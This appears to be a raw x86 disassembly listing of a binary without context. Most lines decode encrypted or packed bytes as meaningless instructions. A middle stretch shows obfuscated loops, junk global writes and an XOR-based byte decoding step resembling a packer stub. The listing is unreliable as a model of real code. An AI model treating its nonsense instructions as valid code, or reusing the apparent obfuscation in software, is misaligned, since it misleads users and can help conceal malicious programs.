  4058e1:	jmp    0x3771:0xf13b2e65
  4058e8:	push   ecx
  4058e9:	out    0xf5,al
  4058eb:	mov    bl,0x1c
  4058ed:	xor    eax,0xfdc6e181
  4058f2:	mov    bl,BYTE PTR [esi-0x69bf7563]
  4058f8:	test   DWORD PTR [ebx],eax
  4058fa:	push   edi
  4058fb:	loope  0x4058b9
  4058fd:	scas   al,BYTE PTR es:[edi]
  4058fe:	lahf   
  4058ff:	cmp    al,BYTE PTR [eax]
  405901:	push   es
  405902:	mov    ds:0xf7424235,eax
  405907:	mov    ds:0xed8b65a0,eax
  40590c:	imul   ecx,DWORD PTR [edx+0x74],0x35abc48a
  405913:	ror    BYTE PTR [eax+0x78435c71],0x97
  40591a:	test   BYTE PTR [edi+ebx*1+0x31141436],0x9d
  405922:	rcl    BYTE PTR [ecx+0x4a],1
  405925:	mov    bl,0xd
  405927:	xchg   BYTE PTR [ecx+0x4e3ffbb9],ah
  40592d:	mov    al,0xb0
  40592f:	nop
  405930:	shl    DWORD PTR [ecx+ecx*4+0x6af89dc6],1
  405937:	jne    0x4058c0
  405939:	mov    ecx,0x3cfce794
  40593e:	fs sub al,0xa2
  405941:	fcmovbe st,st(2)
  405943:	test   al,0xbe
  405945:	mov    DWORD PTR [ebp+0x15bfcd07],edx
  40594b:	mov    al,0x76
  40594d:	adc    cl,BYTE PTR [edi]
  40594f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405950:	dec    BYTE PTR [edi]
  405952:	js     0x405913
  405954:	and    ch,BYTE PTR [eax]
  405956:	xor    esp,0xffffffb4
  405959:	lahf   
  40595a:	jecxz  0x4059a0
  40595c:	dec    ebp
  40595d:	jns    0x405930
  40595f:	xor    dl,BYTE PTR [ebp-0x3b]
  405962:	lahf   
  405963:	iret   
  405964:	mov    ds:0x5f4fe282,al
  405969:	push   cs
  40596a:	pushf  
  40596b:	adc    BYTE PTR [ebx-0x3da8184f],dh
  405971:	retf   
  405972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405973:	imul   edi,DWORD PTR [esi+0x1d3f7607],0x7d
  40597a:	add    bh,BYTE PTR [eax-0x3f2bb977]
  405980:	icebp  
  405981:	fimul  DWORD PTR [edx]
  405983:	ja     0x405968
  405985:	(bad)  [edx+0x1158213b]
  40598b:	dec    edi
  40598c:	dec    esi
  40598d:	xchg   BYTE PTR [ebp-0x1d63fe66],cl
  405993:	jle    0x405928
  405995:	or     eax,0x92994899
  40599a:	sub    bl,BYTE PTR [edx]
  40599c:	mov    cl,0x6b
  40599e:	loop   0x405976
  4059a0:	rol    DWORD PTR [esi],1
  4059a2:	mov    edx,0x7bceca16
  4059a7:	(bad)  
  4059a8:	xor    esp,ebp
  4059aa:	sub    esi,ecx
  4059ac:	lods   eax,DWORD PTR ds:[esi]
  4059ad:	sub    BYTE PTR [ebp+0x34],0xd3
  4059b1:	arpl   WORD PTR [esi-0xd683747],di
  4059b7:	adc    al,0xc
  4059b9:	test   DWORD PTR [ebp+0x70],esp
  4059bc:	dec    edx
  4059bd:	jecxz  0x405962
  4059bf:	loope  0x4059fe
  4059c1:	pop    ds
  4059c2:	imul   esi,DWORD PTR [eax-0x3b],0x3de37c38
  4059c9:	and    eax,DWORD PTR [ecx+0xd]
  4059cc:	bound  ecx,QWORD PTR [ecx-0x12648fc6]
  4059d2:	mov    edx,0x43d2725b
  4059d7:	retf   
  4059d8:	fwait
  4059d9:	repnz cwde 
  4059db:	xor    al,0x7c
  4059dd:	mov    ah,0xca
  4059df:	sub    BYTE PTR [edx],0xca
  4059e2:	mov    ebx,0xd4da1a18
  4059e7:	push   ebx
  4059e8:	inc    ebx
  4059e9:	div    BYTE PTR [edi+edx*4]
  4059ec:	je     0x4059f4
  4059ee:	ins    DWORD PTR es:[edi],dx
  4059ef:	(bad)  
  4059f1:	(bad)  [edx-0x3009a15b]
  4059f7:	xor    DWORD PTR [eax-0x7a281622],esi
  4059fd:	dec    edi
  4059fe:	adc    BYTE PTR [esi],bh
  405a00:	mov    WORD PTR [esi+0x5aa2fb05],fs
  405a06:	pop    edi
  405a07:	pop    ebp
  405a08:	mov    dh,0xde
  405a0a:	adc    edi,edi
  405a0c:	addr16 mov ebx,0x97fec73f
  405a12:	shr    dl,1
  405a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a15:	jle    0x405a90
  405a17:	imul   edi,DWORD PTR [edx+0x32],0xfffffff1
  405a1b:	mov    al,ds:0xaba7ddcc
  405a20:	hlt    
  405a21:	sbb    BYTE PTR [edi+0xa],0xa2
  405a25:	xor    BYTE PTR [esi+edi*2-0x5b],dl
  405a29:	mov    bh,0xf
  405a2b:	idiv   BYTE PTR [edx+0x4d]
  405a2e:	mov    ebx,0xf418d2c7
  405a33:	rcl    BYTE PTR [esi-0x53],cl
  405a36:	out    0x35,eax
  405a38:	fldcw  WORD PTR [edi+0x66]
  405a3b:	ss inc edi
  405a3d:	cmp    eax,0x801b0aa7
  405a42:	ret    
  405a43:	ror    cl,1
  405a45:	mov    BYTE PTR [ebx],dl
  405a47:	es pop ebx
  405a49:	pushf  
  405a4a:	adc    BYTE PTR [edi-0x52],ch
  405a4d:	jb     0x405a65
  405a4f:	loopne 0x405ab2
  405a51:	aam    0xb6
  405a53:	xor    bh,BYTE PTR [esi]
  405a55:	inc    ecx
  405a56:	xor    al,0x2e
  405a58:	mov    DWORD PTR [esi],esi
  405a5a:	daa    
  405a5b:	bnd jbe 0x405a4f
  405a5e:	push   edx
  405a5f:	lods   eax,DWORD PTR ds:[esi]
  405a60:	mov    ch,0xde
  405a62:	adc    al,0xad
  405a64:	lea    bx,[edx]
  405a67:	sbb    eax,0x65c5d1b0
  405a6c:	in     eax,dx
  405a6d:	dec    ebp
  405a6e:	sbb    ch,BYTE PTR [edx+0xc]
  405a71:	and    ch,dh
  405a73:	fisubr DWORD PTR [esi-0x2ddb6f73]
  405a79:	out    dx,eax
  405a7a:	jne    0x405aba
  405a7c:	fs daa 
  405a7e:	les    ecx,FWORD PTR [ebp-0x24]
  405a81:	test   DWORD PTR [edi-0x196ef441],edi
  405a87:	push   ebp
  405a88:	dec    ecx
  405a89:	jge    0x405ab0
  405a8b:	push   ecx
  405a8c:	test   al,0x19
  405a8e:	mov    ds:0x5847ba80,al
  405a93:	sub    bh,BYTE PTR [ebx]
  405a95:	mov    al,ah
  405a97:	add    al,0x4f
  405a99:	xor    al,BYTE PTR [edx-0xd]
  405a9c:	ins    BYTE PTR es:[edi],dx
  405a9d:	mov    db5,esp
  405aa0:	sbb    esp,DWORD PTR [eax]
  405aa2:	test   eax,0x85584a9a
  405aa7:	ret    0xa581
  405aaa:	sbb    DWORD PTR [edx-0x7da3bb98],ecx
  405ab0:	fisubr DWORD PTR fs:[esi-0x74b1b36b]
  405ab7:	test   BYTE PTR [edx-0x559d3891],al
  405abd:	xchg   esp,eax
  405abe:	cdq    
  405abf:	push   edx
  405ac0:	pop    edx
  405ac1:	ds adc eax,0xdbdfcf10
  405ac7:	scas   al,BYTE PTR es:[edi]
  405ac8:	fiadd  WORD PTR [ebx+0x41241c9f]
  405ace:	mov    dh,0x72
  405ad0:	or     DWORD PTR [ebx+0x674b8eb4],esp
  405ad6:	inc    esi
  405ad7:	ds iret 
  405ad9:	or     al,BYTE PTR [ebx-0x14e4167c]
  405adf:	fstp   DWORD PTR [ebx+0x67]
  405ae2:	dec    edx
  405ae3:	adc    BYTE PTR [esi],bl
  405ae5:	and    bl,bh
  405ae7:	mov    al,0x9e
  405ae9:	adc    DWORD PTR [esi-0x44],ecx
  405aec:	push   edx
  405aed:	(bad)  [ecx]
  405aef:	imul   esi,DWORD PTR fs:[esi],0x65
  405af3:	scas   eax,DWORD PTR es:[edi]
  405af4:	cmp    eax,0x14ac156
  405af9:	mov    edx,0xd189bdb
  405afe:	jae    0x405ac4
  405b00:	lock xlat BYTE PTR ds:[ebx]
  405b02:	or     BYTE PTR [ecx+0x76],al
  405b05:	shl    DWORD PTR [ebp-0x27],cl
  405b08:	mov    ch,0x14
  405b0a:	dec    edi
  405b0b:	xchg   ebx,eax
  405b0c:	(bad)  
  405b0d:	lods   al,BYTE PTR ds:[esi]
  405b0e:	inc    esp
  405b0f:	mov    dh,0x5c
  405b11:	(bad)  
  405b12:	cli    
  405b13:	sub    eax,0x1d45572d
  405b18:	lsl    edi,WORD PTR [esi+0xd507b85]
  405b1f:	xchg   ecx,eax
  405b20:	(bad)  [edi-0x35]
  405b23:	pushf  
  405b24:	in     eax,0xd9
  405b26:	add    eax,0x9a2b884d
  405b2b:	jns    0x405b58
  405b2d:	shl    ch,cl
  405b2f:	push   eax
  405b30:	repz lock rcr DWORD PTR gs:[ecx-0x5],1
  405b36:	add    bl,cl
  405b38:	cmp    BYTE PTR [edx],0x21
  405b3b:	xchg   ebx,eax
  405b3c:	in     al,0xb6
  405b3e:	jo     0x405b76
  405b40:	clc    
  405b41:	fwait
  405b42:	ror    BYTE PTR [ecx],0x60
  405b45:	clc    
  405b46:	aaa    
  405b47:	and    DWORD PTR [eax-0x46139ee9],ebx
  405b4d:	out    dx,eax
  405b4e:	push   eax
  405b4f:	aaa    
  405b50:	sbb    ecx,DWORD PTR [edx-0x652b48e7]
  405b56:	and    BYTE PTR [esi+ebp*1],dl
  405b59:	repz popf 
  405b5b:	mov    bh,0x2d
  405b5d:	or     eax,0xc7f55d7f
  405b62:	pusha  
  405b63:	addr16 mov esp,ebp
  405b66:	lock mov DWORD PTR [esi+esi*8-0x48],ebx
  405b6b:	mov    ecx,0x528d03b4
  405b70:	add    DWORD PTR [ebx-0x73ee912b],ebp
  405b76:	dec    esi
  405b77:	add    dl,BYTE PTR [edi-0x2c]
  405b7a:	repz xor BYTE PTR ds:0xf4bc5ae6,dl
  405b81:	sti    
  405b82:	sub    eax,0xa51db61c
  405b87:	push   cs
  405b88:	or     ch,cl
  405b8a:	fidiv  DWORD PTR [esp+edx*8-0x1ef489d1]
  405b91:	add    BYTE PTR [edi-0x22],bl
  405b94:	ins    BYTE PTR es:[edi],dx
  405b95:	(bad)  
  405b96:	pop    ebp
  405b97:	or     ebx,DWORD PTR [edi+edx*4]
  405b9a:	lock xchg edi,eax
  405b9c:	cdq    
  405b9d:	xor    al,0x58
  405b9f:	cmp    edx,DWORD PTR [ebx+0x2b]
  405ba2:	ja     0x405bda
  405ba4:	dec    edi
  405ba5:	sub    al,0x2d
  405ba7:	mov    ebx,0x77d39c41
  405bac:	popf   
  405bad:	jmp    0xa5f:0xd243d3ad
  405bb4:	in     eax,0x82
  405bb6:	repnz and ecx,DWORD PTR [edx-0x181b2df4]
  405bbd:	out    dx,eax
  405bbe:	inc    di
  405bc0:	lods   eax,DWORD PTR ds:[esi]
  405bc1:	mov    eax,ds:0xff07b4
  405bc6:	lods   al,BYTE PTR ds:[esi]
  405bc7:	(bad)  
  405bc8:	cmc    
  405bc9:	mov    bh,0x33
  405bcb:	ret    
  405bcc:	mov    eax,0x410d289c
  405bd1:	inc    ebx
  405bd2:	mov    WORD PTR [edi],fs
  405bd4:	aad    0x6e
  405bd6:	imul   edx,DWORD PTR [edi+0x74892825],0xb40b7c5a
  405be0:	push   0x44
  405be2:	and    bl,0x74
  405be5:	inc    esp
  405be6:	or     eax,0x1e69db8c
  405beb:	lea    esi,[ecx+0x6a771a10]
  405bf1:	push   ss
  405bf2:	sar    DWORD PTR [edx*1+0x447bdbd1],cl
  405bf9:	adc    eax,0xc3885868
  405bfe:	xor    BYTE PTR [esi-0x10],bh
  405c01:	icebp  
  405c02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c03:	push   ss
  405c04:	adc    esp,ecx
  405c06:	cmc    
  405c07:	dec    edi
  405c08:	fldenv [eax-0x7c629109]
  405c0e:	mov    ebx,0x8ea84bf3
  405c13:	aad    0x3b
  405c15:	(bad)
  405c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c19:	mov    ebp,0x3923d47e
  405c1e:	xlat   BYTE PTR ds:[ebx]
  405c1f:	clc    
  405c20:	jp     0x405bb6
  405c22:	xor    eax,0x1d1459ee
  405c27:	call   0x1dbd:0xdaed2cd1
  405c2e:	hlt    
  405c2f:	cmp    DWORD PTR [edi-0x9b4c9b0],esi
  405c35:	adc    ch,dh
  405c37:	mov    DWORD PTR [esi],ecx
  405c39:	xor    eax,0xf9322c1b
  405c3e:	and    ebp,DWORD PTR [ecx+0x4a]
  405c41:	cli    
  405c42:	cmp    edx,esp
  405c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c45:	pop    esi
  405c46:	gs xchg edx,eax
  405c48:	sbb    DWORD PTR [ebp+0x65],ebp
  405c4b:	or     eax,0x795327e2
  405c50:	cdq    
  405c51:	icebp  
  405c52:	cmp    bh,BYTE PTR [eax-0x6]
  405c55:	retf   0x3b7e
  405c58:	iret   
  405c59:	les    esi,FWORD PTR [edi+esi*2]
  405c5c:	sub    eax,ecx
  405c5e:	aad    0xde
  405c60:	xor    bh,BYTE PTR [ecx+edx*4]
  405c63:	mov    edx,DWORD PTR [edi+edi*8+0x1]
  405c67:	jmp    0x405c09
  405c69:	xor    al,0x17
  405c6b:	inc    edi
  405c6c:	push   eax
  405c6d:	pusha  
  405c6e:	add    BYTE PTR [ebx-0x4118861b],bh
  405c74:	mov    ds:0x43202117,eax
  405c79:	clc    
  405c7a:	not    esi
  405c7c:	inc    bp
  405c7e:	pop    es
  405c7f:	loope  0x405c08
  405c81:	xchg   ecx,eax
  405c82:	mov    bh,0xbd
  405c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c85:	xlat   BYTE PTR ds:[ebx]
  405c86:	stos   BYTE PTR es:[edi],al
  405c87:	pop    es
  405c88:	cdq    
  405c89:	sbb    bl,BYTE PTR [ebx]
  405c8b:	sbb    BYTE PTR [edi+0x4abcb959],bl
  405c91:	imul   ebx,edx,0xffffff8b
  405c94:	and    DWORD PTR [ecx+ebp*4-0x1a],ecx
  405c98:	jae    0x405c83
  405c9a:	mov    cl,0xb8
  405c9c:	pusha  
  405c9d:	ss ret 0x343c
  405ca1:	mov    ch,0x8a
  405ca3:	inc    ecx
  405ca4:	mov    edi,0x9bfa5157
  405ca9:	(bad)  
  405caa:	dec    ecx
  405cab:	pop    ss
  405cac:	sbb    al,0xba
  405cae:	sahf   
  405caf:	repz push eax
  405cb1:	call   0x559cb33a
  405cb6:	mov    WORD PTR [ebp+0xf3f556c],ds
  405cbc:	and    cl,BYTE PTR [ebx+edx*8+0x3d2ec668]
  405cc3:	mov    dh,0xaf
  405cc5:	inc    eax
  405cc6:	push   ebx
  405cc7:	repnz add BYTE PTR ds:[edi-0x617faa2e],bh
  405ccf:	or     al,0x5a
  405cd1:	(bad)  
  405cd3:	sub    eax,0x13dc5769
  405cd8:	add    dh,bh
  405cda:	nop
  405cdb:	mov    al,0x60
  405cdd:	cdq    
  405cde:	dec    eax
  405cdf:	leave  
  405ce0:	icebp  
  405ce1:	lea    ebp,[esi+0x29]
  405ce4:	mov    eax,0x9b9fb8a8
  405ce9:	dec    ebp
  405cea:	in     al,dx
  405ceb:	std    
  405cec:	pop    edi
  405ced:	cmp    DWORD PTR [edx+0x37],edx
  405cf0:	outs   dx,DWORD PTR ds:[esi]
  405cf1:	(bad)
  405cf4:	cs bswap ecx
  405cf7:	sub    eax,0x96144861
  405cfc:	out    0x81,al
  405cfe:	arpl   WORD PTR [edi],dx
  405d00:	sub    BYTE PTR [ecx+0x558bec4d],cl
  405d06:	in     al,dx
  405d07:	xor    edx,esi
  405d09:	add    DWORD PTR ds:0x42d01c,0x429028
  405d13:	add    edx,0x7f55d8f2
  405d19:	mov    DWORD PTR ds:0x42a004,0x7cae
  405d23:	lea    ecx,[ebp+eax*4-0xb4]
  405d2a:	mov    DWORD PTR [ecx],edx
  405d2c:	mov    DWORD PTR ds:0x42d018,0x76cd
  405d36:	mov    edx,DWORD PTR [ecx]
  405d38:	mov    DWORD PTR ds:0x429024,0x63
  405d42:	cmp    edx,0x244ecb93
  405d48:	mov    DWORD PTR ds:0x42c01c,0x464d
  405d52:	jbe    0x405d6d
  405d58:	sub    DWORD PTR ds:0x42a000,0x42d004
  405d62:	add    DWORD PTR [ecx],0x405fcdc
  405d68:	jmp    0x405d7d
  405d6d:	or     DWORD PTR ds:0x42b014,0x429010
  405d77:	add    DWORD PTR [ecx],0xfdaf4324
  405d7d:	sbb    ecx,DWORD PTR ds:0x42a000
  405d83:	mov    ecx,DWORD PTR [ebp-0x18]
  405d86:	sbb    DWORD PTR ds:0x42d010,0x42c010
  405d90:	xor    ecx,esi
  405d92:	sbb    DWORD PTR ds:0x42a004,0x42d018
  405d9c:	inc    eax
  405d9d:	inc    DWORD PTR [ebp-0x14]
  405da0:	add    ecx,edi
  405da2:	mov    DWORD PTR ds:0x42d01c,0x794d
  405dac:	cmp    eax,ecx
  405dae:	mov    DWORD PTR ds:0x42b004,0x68cc
  405db8:	jb     0x405d04
  405dbe:	and    DWORD PTR ds:0x42b010,0x0
  405dc8:	jmp    0x405ddb
  405dcd:	xor    eax,eax
  405dcf:	or     eax,DWORD PTR ds:0x42b010
  405dd5:	inc    eax
  405dd6:	mov    ds:0x42b010,eax
  405ddb:	cmp    DWORD PTR ds:0x42b010,0x10
  405de2:	jae    0x405e2a
  405de8:	cmp    DWORD PTR ds:0x42b010,0xa
  405def:	jbe    0x405e2a
  405df5:	jmp    0x405e0d
  405dfa:	push   0x42f19b
  405dff:	push   DWORD PTR [ebp-0x28]
  405e02:	push   0x6b57
  405e07:	call   DWORD PTR ds:0x43003b
  405e0d:	cmp    DWORD PTR ds:0x42b010,0x9
  405e14:	jne    0x405e25
  405e1a:	mov    eax,ds:0x42b010
  405e1f:	inc    eax
  405e20:	mov    ds:0x42b010,eax
  405e25:	jmp    0x405dcd
  405e2a:	mov    dl,BYTE PTR [ebp-0x21]
  405e2d:	mov    eax,DWORD PTR [ebp-0x34]
  405e30:	xor    al,0xa4
  405e32:	or     DWORD PTR ds:0x429020,0x7a52
  405e3c:	mov    cl,0x14
  405e3e:	and    DWORD PTR ds:0x42c004,0x42a008
  405e48:	sub    cl,al
  405e4a:	add    dl,cl
  405e4c:	mov    ecx,DWORD PTR [ebp-0x1c]
  405e4f:	xor    cl,0xa4
  405e52:	neg    DWORD PTR ds:0x42d008
  405e58:	sub    cl,0x14
  405e5b:	xor    DWORD PTR ds:0x429014,0x42b01c
  405e65:	ror    dl,cl
  405e67:	xor    eax,eax
  405e69:	mov    eax,DWORD PTR [ebp-0xc]
  405e6c:	add    DWORD PTR ds:0x42c00c,edx
  405e72:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  405e79:	and    DWORD PTR ds:0x42b000,0x0
  405e83:	jmp    0x405e96
  405e88:	xor    eax,eax
  405e8a:	add    eax,DWORD PTR ds:0x42b000
  405e90:	inc    eax
  405e91:	mov    ds:0x42b000,eax
  405e96:	cmp    DWORD PTR ds:0x42b000,0x10
  405e9d:	jae    0x405ede
  405ea3:	cmp    DWORD PTR ds:0x42b000,0x7
  405eaa:	jbe    0x405ede
  405eb0:	jmp    0x405ebe
  405eb5:	push   DWORD PTR [ebp-0x14]
  405eb8:	call   DWORD PTR ds:0x43003f
  405ebe:	cmp    DWORD PTR ds:0x42b000,0x6
  405ec5:	jne    0x405ed9
  405ecb:	xor    eax,eax
  405ecd:	xor    eax,DWORD PTR ds:0x42b000
  405ed3:	inc    eax
  405ed4:	mov    ds:0x42b000,eax
  405ed9:	jmp    0x405e88
  405ede:	mov    eax,DWORD PTR [ebp-0xc]
  405ee1:	mov    ecx,DWORD PTR [ebp-0x28]
  405ee4:	sub    eax,edi
  405ee6:	xor    eax,esi
  405ee8:	cmp    eax,ecx
  405eea:	jne    0x405f14
  405ef0:	mov    eax,DWORD PTR [ebp-0x8]
  405ef3:	mov    ecx,DWORD PTR [ebp-0x10]
  405ef6:	xor    eax,esi
  405ef8:	xor    ecx,esi
  405efa:	sub    eax,ecx
  405efc:	sub    eax,edi
  405efe:	xor    eax,esi
  405f00:	mov    DWORD PTR [ebp-0x8],eax
  405f03:	mov    eax,DWORD PTR [ebp-0x10]
  405f06:	xor    eax,esi
  405f08:	mov    ecx,0xffcd8d94
  405f0d:	sub    ecx,eax
  405f0f:	jmp    0x405f23
  405f14:	mov    eax,DWORD PTR [ebp-0x10]
  405f17:	xor    eax,esi
  405f19:	mov    ecx,0xffcd8d14
  405f1e:	sub    ecx,eax
  405f20:	add    ecx,DWORD PTR [ebp-0xc]
  405f23:	mov    DWORD PTR [ebp-0xc],ecx
  405f26:	mov    eax,DWORD PTR [ebp-0x8]
  405f29:	cmp    eax,0xf89c85b0
  405f2e:	jne    0x403809
  405f34:	mov    DWORD PTR [ebp-0x34],0x9
  405f3b:	mov    ecx,DWORD PTR [ebp+0x8]
  405f3e:	xor    ecx,esi
  405f40:	add    ecx,edi
  405f42:	jmp    0x40cbb6
  405f47:	lea    eax,[ecx+ebx*1]
  405f4a:	mov    DWORD PTR [ebp-0x2c],eax
  405f4d:	mov    eax,DWORD PTR [ebp-0x58]
  405f50:	sub    eax,ecx
  405f52:	mov    DWORD PTR [ebp-0x1c],eax
  405f55:	mov    eax,DWORD PTR [ebp-0x1c]
  405f58:	mov    DWORD PTR [ebp-0x14],eax
  405f5b:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5e:	mov    DWORD PTR [ebp-0x38],0xf89c85b0
  405f65:	mov    DWORD PTR [ebp-0x54],eax
  405f68:	mov    DWORD PTR [ebp-0x20],0xf89c85b1
  405f6f:	mov    eax,DWORD PTR [ebp-0x38]
  405f72:	xor    eax,esi
  405f74:	add    eax,edi
  405f76:	mov    DWORD PTR [ebp-0x10],eax
  405f79:	jmp    0x4082d5
  405f7e:	lds    ebp,FWORD PTR [ecx]
  405f80:	lea    esi,[esi-0x7f]
  405f83:	(bad)  
  405f84:	jns    0x405fff
  405f86:	jbe    0x405ffc
  405f88:	retf   
  405f89:	mov    BYTE PTR [ebp-0x7f2b2b4],bl
  405f8f:	xor    BYTE PTR [edx+0x7a],bh
  405f92:	cmp    ebx,DWORD PTR [edi+0x7a]
  405f95:	jp     0x405f67
  405f97:	(bad)  
  405f98:	sub    ebp,ecx
  405f9a:	xor    DWORD PTR [ebx],ebp
  405f9c:	cli    
  405f9d:	cmp    eax,0xc300c49b
  405fa2:	stos   BYTE PTR es:[edi],al
  405fa3:	mov    DWORD PTR [eax+0x16],eax
  405fa6:	lahf   
  405fa7:	push   ebp
  405fa8:	js     0x405fd6
  405faa:	hlt    
  405fab:	adc    edi,0xfe1b3c6d
  405fb1:	and    eax,0x409b97aa
  405fb6:	jns    0x405fcc
  405fb8:	fstp   TBYTE PTR ds:0x2f1666ff
  405fbe:	xor    BYTE PTR [ecx-0x5a],bl
  405fc1:	in     eax,dx
  405fc2:	dec    edx
  405fc3:	out    dx,eax
  405fc4:	pusha  
  405fc5:	mov    eax,ds:0xbfb09364
  405fca:	mov    dh,0x3c
  405fcc:	sbb    eax,0x81dcf14
  405fd1:	ja     0x405f54
  405fd3:	pop    es
  405fd4:	pop    esp
  405fd5:	push   ds
  405fd6:	and    al,0xf7
  405fd8:	fidiv  DWORD PTR [ecx]
  405fda:	(bad)  
  405fdb:	and    ecx,ebx
  405fdd:	std    
  405fde:	mov    gs,esi
  405fe0:	xor    eax,0x7282c3c3
  405fe5:	test   al,0xa0
  405fe7:	cld    
  405fe8:	loopne 0x406042
  405fea:	outs   dx,DWORD PTR ds:[esi]
  405feb:	mov    cs,ebp
  405fed:	imul   ebx,DWORD PTR [ebx-0x4b4be2e],0x8880f5c
  405ff7:	sar    BYTE PTR [eax+ebx*2+0x2a164251],1
  405ffe:	(bad)  
  405fff:	stc    
  406000:	call   0x92de0e7a
  406005:	popf   
  406006:	sti    
  406007:	sbb    eax,0xd3e7b3e6
  40600c:	jae    0x40604e
  40600e:	cdq    
  40600f:	mov    eax,0x807c099f
  406014:	xor    DWORD PTR [ecx],ebx
  406016:	mov    edx,0xff39579c
  40601b:	push   0xffffffa2
  40601d:	aas    
  40601e:	push   0x5eb11c90
  406023:	imul   edx,DWORD PTR [edi-0xe5ab242],0x20
  40602a:	in     eax,0x23
  40602c:	lods   al,BYTE PTR ds:[esi]
  40602d:	push   ds
  40602e:	jb     0x405ffe
  406030:	lock xor ebp,edi
  406033:	leave  
  406034:	(bad)
  406037:	pop    ebx
  406038:	shr    DWORD PTR [ecx-0x7b925fb9],0xc4
  40603f:	sub    eax,0xdf9bd76f
  406044:	lods   eax,DWORD PTR ds:[esi]
  406045:	xchg   eax,eax
  406047:	xchg   DWORD PTR [esi+edx*8],ebx
  40604a:	mov    cl,0x0
  40604c:	fstp   QWORD PTR [eax]
  40604e:	mov    ecx,edi
  406050:	push   0xf1e260ca
  406055:	enter  0x4d0e,0x40
  406059:	aam    0xcc
  40605b:	mov    al,ds:0x497f83b1
  406060:	jmp    0x8df545fb
  406065:	cdq    
  406066:	cld    
  406067:	loope  0x406043
  406069:	ja     0x4060b3
  40606b:	mov    gs,WORD PTR [eax-0x47]
  40606e:	jbe    0x4060c5
  406070:	nop
  406071:	lods   eax,DWORD PTR ds:[esi]
  406072:	lods   al,BYTE PTR ds:[esi]
  406073:	in     al,0xe0
  406075:	sub    eax,0x550d132b
  40607a:	and    eax,0xf39348f0
  40607f:	mul    ebx
  406081:	xor    ecx,esp
  406083:	rcl    dh,0x8e
  406086:	ins    DWORD PTR es:[edi],dx
  406087:	jp     0x40606b
  406089:	jle    0x4060f9
  40608b:	pop    esp
  40608c:	stos   BYTE PTR es:[edi],al
  40608d:	dec    edx
  40608e:	dec    edi
  40608f:	mov    edi,0xb7ebeb76
  406094:	stos   BYTE PTR es:[edi],al
  406095:	int    0x5b
  406097:	addr16 push ds
  406099:	imul   edi,edi,0x804655d2
  40609f:	sar    BYTE PTR [eax],0xef
  4060a2:	arpl   WORD PTR es:[edx+0x54],ax
  4060a6:	sti    
  4060a7:	jnp    0x40610c
  4060a9:	cld    
  4060aa:	inc    ecx
  4060ab:	push   esp
  4060ac:	jae    0x4060e1
  4060ae:	inc    ebp
  4060af:	adc    al,0x5c
  4060b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060b2:	jnp    0x4060eb
  4060b4:	dec    ebx
  4060b5:	pop    ebx
  4060b6:	mov    esi,0x3a674c50
  4060bb:	xchg   BYTE PTR [esp+edx*2+0x2519526e],bh
  4060c2:	mov    edi,0xf495d49e
  4060c7:	and    BYTE PTR [edx],ch
  4060c9:	lea    eax,[eax+0x12410b9f]
  4060cf:	mov    eax,ds:0x54f05330
  4060d4:	sti    
  4060d5:	pop    ebp
  4060d6:	xchg   edi,eax
  4060d7:	add    al,0x15
  4060d9:	push   0x55
  4060db:	and    dh,BYTE PTR [ebp+0x37]
  4060de:	call   0xff2c:0xee9dd3b6
  4060e5:	hlt    
  4060e6:	or     eax,ebp
  4060e8:	mov    ah,BYTE PTR [edx+ebp*4]
  4060eb:	dec    ebp
  4060ec:	xlat   BYTE PTR ds:[ebx]
  4060ed:	inc    ecx
  4060ee:	test   BYTE PTR [ecx],ch
  4060f0:	mov    ds:0x4d651a4c,eax
  4060f5:	outs   dx,BYTE PTR ds:[esi]
  4060f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060f7:	add    BYTE PTR [ebp+ebp*1+0x7ec836cc],cl
  4060fe:	mov    ah,0x2c
  406100:	mov    ah,0x12
  406102:	arpl   WORD PTR [edi+edx*1],bp
  406105:	sub    DWORD PTR ds:0x8615b636,edi
  40610b:	ss jno 0x406126
  40610e:	adc    ch,BYTE PTR [edx+0x30]
  406111:	push   esp
  406112:	or     BYTE PTR [edi-0x206c199e],bh
  406118:	jmp    0x231b2d99
  40611d:	cmp    al,0x71
  40611f:	fcom   st(3)
  406121:	repnz std 
  406123:	in     al,dx
  406124:	cmp    eax,0x7a5b4b3c
  406129:	pop    edx
  40612a:	dec    eax
  40612b:	push   ss
  40612c:	xchg   edi,eax
  40612d:	inc    edi
  40612e:	repnz (bad) 
  406130:	pop    edx
  406131:	pop    ebx
  406132:	popf   
  406133:	xor    DWORD PTR [esi+0x1dffdb4b],ecx
  406139:	jnp    0x406184
  40613b:	(bad)  
  40613c:	mov    eax,0x4f3fbbb8
  406141:	test   eax,0x4c2ffd07
  406146:	add    dh,BYTE PTR [esi+eax*1]
  406149:	pop    eax
  40614a:	div    DWORD PTR [esi-0x64b5c382]
  406150:	data16 je 0x406132
  406153:	pop    ss
  406154:	fcmovnbe st,st(1)
  406156:	pushf  
  406157:	or     ecx,esi
  406159:	lock jle 0x40614d
  40615c:	loop   0x40617e
  40615e:	mov    BYTE PTR [ecx],dl
  406160:	test   eax,0x4ab1f267
  406165:	xlat   BYTE PTR ds:[ebx]
  406166:	push   ebx
  406167:	or     BYTE PTR [ebx-0x4c],bl
  40616a:	in     al,0x69
  40616c:	mov    esi,0x43224add
  406171:	xor    ch,BYTE PTR [esp+ecx*4]
  406174:	xchg   esi,eax
  406175:	xor    edx,DWORD PTR [edx]
  406177:	cld    
  406178:	mov    ecx,0xf738bbb8
  40617d:	xor    eax,0x6300a31
  406182:	pop    ecx
  406183:	cmp    ebx,esi
  406185:	imul   ebp,DWORD PTR [eax+ebx*1],0xffffff93
  406189:	(bad)  
  40618a:	xchg   ebx,eax
  40618b:	shl    DWORD PTR [esi-0x549051c4],1
  406191:	popf   
  406192:	xor    BYTE PTR [esi],bl
  406194:	inc    bh
  406196:	mov    ecx,0xe9cee74a
  40619b:	push   0xffffff85
  40619d:	daa    
  40619e:	or     bl,BYTE PTR [esi+eax*1]
  4061a1:	xor    edi,DWORD PTR [edi]
